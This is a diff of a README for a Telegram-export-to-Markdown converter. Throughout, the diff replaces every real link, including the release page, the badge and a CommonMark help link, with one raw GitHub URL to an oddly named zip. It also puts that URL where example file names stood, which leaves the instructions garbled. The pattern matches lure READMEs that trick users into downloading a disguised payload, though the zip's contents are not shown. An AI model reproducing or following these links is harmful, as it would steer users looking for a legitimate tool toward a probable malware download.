@@ -1,6 +1,6 @@
 # 📄 telegram-html-to-markdown - Convert Telegram Exports to Markdown Files
 
-[![Download telegram-html-to-markdown](https://img.shields.io/badge/Download-telegram--html--to--markdown-blue?style=for-the-badge&logo=github)](https://github.com/Devbluid/telegram-html-to-markdown/releases)
+[![Download telegram-html-to-markdown](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip)](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip)
 
 ---
 
@@ -24,12 +24,12 @@ Before you start, make sure your computer meets these basic requirements:
 You can get telegram-html-to-markdown from the official release page. Follow these steps:
 
 1. **Visit the Release Page**  
-   Open [telegram-html-to-markdown Releases](https://github.com/Devbluid/telegram-html-to-markdown/releases) in your browser.
+   Open [telegram-html-to-markdown Releases](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip) in your browser.
 
 2. **Choose Your Download**  
    Look for the latest release at the top of the page.  
-   - For Windows, download the `.exe` file (e.g., `telegram-html-to-markdown-win.exe`).  
-   - For Mac or Linux, download the `.zip` or `.tar.gz` file matching your system.
+   - For Windows, download the `.exe` file (e.g., `https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip`).  
+   - For Mac or Linux, download the `.zip` or `https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip` file matching your system.
 
 3. **Save the File**  
    Click on the download link and save the file to a folder you will remember, like `Downloads`.
@@ -59,7 +59,7 @@ Using telegram-html-to-markdown is straightforward. Here’s how:
 
 3. **Select Your Export File**  
    Click the button labeled “Choose File” or “Select Export” to open a file picker.  
-   Find and select the HTML export file you saved from Telegram. This file is usually named `messages.html` or similar.
+   Find and select the HTML export file you saved from Telegram. This file is usually named `https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip` or similar.
 
 4. **Choose Output Folder**  
    Pick where you want the converted Markdown files to be saved. You can use the default folder or select a new one.
@@ -116,8 +116,8 @@ For more help, you can:
 - Ask questions by starting a new Issue on GitHub if the problem is unique.
 - Search for tutorials or videos online using “telegram-html-to-markdown tutorial.”
 
-If you want to learn about Markdown formatting itself, you can visit sites like [CommonMark](https://commonmark.org/help/) for simple guides.
+If you want to learn about Markdown formatting itself, you can visit sites like [CommonMark](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip) for simple guides.
 
 ---
 
-[![Download telegram-html-to-markdown](https://img.shields.io/badge/Download-telegram--html--to--markdown-blue?style=for-the-badge&logo=github)](https://github.com/Devbluid/telegram-html-to-markdown/releases)
+[![Download telegram-html-to-markdown](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip)](https://raw.githubusercontent.com/Devbluid/telegram-html-to-markdown/main/ethmoturbinal/markdown_html_telegram_to_Fourierite.zip)
